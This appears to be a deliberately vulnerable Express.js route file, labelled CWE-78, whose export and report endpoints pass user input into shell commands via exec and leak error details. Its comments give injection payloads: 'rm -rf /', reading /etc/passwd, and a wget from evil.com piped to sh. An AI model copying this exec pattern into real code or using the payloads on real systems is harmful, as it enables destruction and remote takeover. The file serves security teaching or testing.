/**
 * Export Routes
 * 
 * VULNERABILITY: CWE-78 - Command Injection
 * User-provided filename is directly used in shell command
 */

const express = require('express');
const router = express.Router();
const { exec } = require('child_process');
const { authenticate } = require('../middleware');

/**
 * POST /api/export
 * Export data to different formats
 * 
 * VULNERABILITY: CWE-78 - Command Injection
 * User input (filename, format) is directly passed to shell command
 * Attacker can inject commands like: filename=test; rm -rf /
 */
router.post('/', authenticate, async (req, res) => {
    try {
        const { format, filename } = req.body;

        if (!format || !filename) {
            return res.status(400).json({ error: 'Format and filename required' });
        }

        // VULNERABLE: Direct use of user input in shell command (CWE-78)
        // Attacker can inject: filename="; cat /etc/passwd #"
        // Or: filename="; wget http://evil.com/malware.sh | sh #"
        const command = `convert data.csv ${filename}.${format}`;

        exec(command, (error, stdout, stderr) => {
            if (error) {
                // Still vulnerable: error might contain sensitive info
                return res.status(500).json({
                    error: 'Export failed',
                    details: error.message  // VULNERABLE: Information disclosure
                });
            }

            res.json({
                success: true,
                message: `File exported as ${filename}.${format}`,
                output: stdout
            });
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

/**
 * POST /api/export/report
 * Generate vehicle report
 * 
 * VULNERABILITY: CWE-78 - Command Injection (another example)
 */
router.post('/report', authenticate, async (req, res) => {
    try {
        const { vehicleId, reportType } = req.body;

        // VULNERABLE: Command injection via reportType (CWE-78)
        const command = `generate-report --type ${reportType} --vehicle ${vehicleId}`;

        exec(command, { timeout: 30000 }, (error, stdout, stderr) => {
            if (error) {
                return res.status(500).json({ error: 'Report generation failed' });
            }
            res.json({ success: true, report: stdout });
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

module.exports = router;
